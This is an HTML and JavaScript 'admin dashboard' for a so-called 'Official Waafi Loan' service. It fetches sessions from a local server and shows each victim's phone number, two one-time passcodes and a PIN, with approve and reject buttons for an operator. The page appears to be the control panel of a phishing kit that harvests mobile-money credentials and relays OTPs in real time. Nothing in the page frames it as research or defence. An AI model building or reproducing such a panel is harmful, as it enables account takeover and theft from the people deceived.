<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Official Waafi Loan - Admin Dashboard</title>

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<style>
body{
    background:#f5f5f5;
}

.container{
    margin-top:40px;
}

table{
    background:white;
}

.approve{
    background:#198754;
    color:white;
    border:none;
    padding:6px 14px;
    border-radius:5px;
    margin-right:5px;
}

.reject{
    background:#dc3545;
    color:white;
    border:none;
    padding:6px 14px;
    border-radius:5px;
}
</style>

</head>

<body>

<div class="container">

<h2 class="mb-4">
Official Waafi Loan - Admin Dashboard
</h2>

<table class="table table-bordered">

<thead class="table-success">

<tr>

<th>Session ID</th>
<th>Phone</th>
<th>OTP1</th>
<th>Demo PIN</th>
<th>OTP2</th>
<th>Status</th>
<th>Action</th>

</tr>

</thead>

<tbody id="tableBody">

</tbody>

</table>

</div>

<script>

async function loadApplications(){

    const response = await fetch("http://127.0.0.1:5000/applications");

    const sessions = await response.json();

    let html = "";

    for(const sessionId in sessions){

        const app = sessions[sessionId].data;

        html += `
        <tr>

        <td>${sessionId}</td>

        <td>${app.phone}</td>

        <td>${app.otp1}</td>

        <td>${app.step2 ? app.step2.demo_pin : ""}</td>

        <td>${app.step2 ? app.step2.otp2 : ""}</td>

        <td>${app.status}</td>

        <td>

        <button
        class="approve"
        onclick="approve('${sessionId}')">

        Approve

        </button>

        <button
        class="reject"
        onclick="reject('${sessionId}')">

        Reject

        </button>

        </td>

        </tr>
        `;
    }

    document.getElementById("tableBody").innerHTML = html;

}

async function approve(sessionId){

    await fetch(`http://127.0.0.1:5000/approve/${sessionId}`);

    loadApplications();

}

async function reject(sessionId){

    await fetch(`http://127.0.0.1:5000/reject/${sessionId}`);

    loadApplications();

}

loadApplications();

</script>

</body>
</html>
